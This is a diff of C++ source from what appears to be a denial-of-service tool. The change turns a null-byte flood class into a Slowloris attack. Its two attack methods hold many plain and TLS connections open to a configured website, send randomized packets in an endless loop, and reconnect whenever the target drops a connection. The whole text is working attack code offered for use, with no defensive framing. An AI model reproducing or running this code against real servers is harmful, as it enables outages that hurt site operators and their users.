@@ -4,26 +4,30 @@
 #include <unistd.h>
 #include <array>
 #include <openssl/ssl.h>
+#include "../Headers/Slowloris.hpp"
 
-#include "Null_Flood.hpp"
-
-void Null_Flood::attack(const int *id) {
+void Slowloris::attack(const int *id) {
     int r;
     std::vector<int> sockets;
+    std::vector<bool> keep_alive;
     for (int x = 0; x < conf->CONNECTIONS; x++) {
         sockets.push_back(0);
+        keep_alive.push_back(false);
     }
-    int socktype = conf->protocol == config::UDP ? SOCK_DGRAM: SOCK_STREAM;
     while(true) {
         static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
             if(!sockets[x]){
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), socktype);
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
+                keep_alive[x] = false;
             }
-            if((r = write_socket(sockets[x],"\0", 1)) == -1){
+            const char *packet = Randomizer::randomPacket(conf, keep_alive[x]);
+            if((r = write_socket(sockets[x], packet, static_cast<int>(strlen(packet)))) == -1){
                 cleanup(&sockets[x]);
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), socktype);
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
+                keep_alive[x] = false;
             }else{
+                keep_alive[x] = true;
                 if(conf->GetResponse){
                     read_socket(sockets[x]);
                 }
@@ -40,31 +44,36 @@ void Null_Flood::attack(const int *id) {
     }
 }
 
-void Null_Flood::attack_ssl(const int *id) {
+void Slowloris::attack_ssl(const int *id) {
     int r;
     std::vector<int> sockets;
     std::vector<SSL_CTX *> CTXs;
     std::vector<SSL *> SSLs;
-    int socktype = conf->protocol == config::UDP ? SOCK_DGRAM: SOCK_STREAM;
+    std::vector<bool> keep_alive;
     for (int x = 0; x < conf->CONNECTIONS; x++) {
         sockets.push_back(0);
         SSLs.push_back(nullptr);
         CTXs.push_back(nullptr);
+        keep_alive.push_back(false);
     }
     while(true) {
         static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
             if(!sockets[x]){
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), socktype);
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 CTXs[x] = InitCTX();
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
+                keep_alive[x] = false;
             }
-            if((r = write_socket(SSLs[x], "\0", 1)) == -1){
+            const char *packet = Randomizer::randomPacket(conf, keep_alive[x]);
+            if((r = write_socket(SSLs[x], packet, static_cast<int>(strlen(packet)))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), socktype);
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 CTXs[x] = InitCTX();
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
+                keep_alive[x] = false;
             }else{
+                keep_alive[x] = true;
                 if(conf->GetResponse){
                     read_socket(SSLs[x]);
                 }
@@ -81,6 +90,7 @@ void Null_Flood::attack_ssl(const int *id) {
     }
 }
 
-Null_Flood::Null_Flood(const config *conf, Logger *logger) : Http_Flood(conf, logger) {
+Slowloris::Slowloris(const config *conf, Logger *logger) : Http_Flood(conf, logger) {
 
 }
+
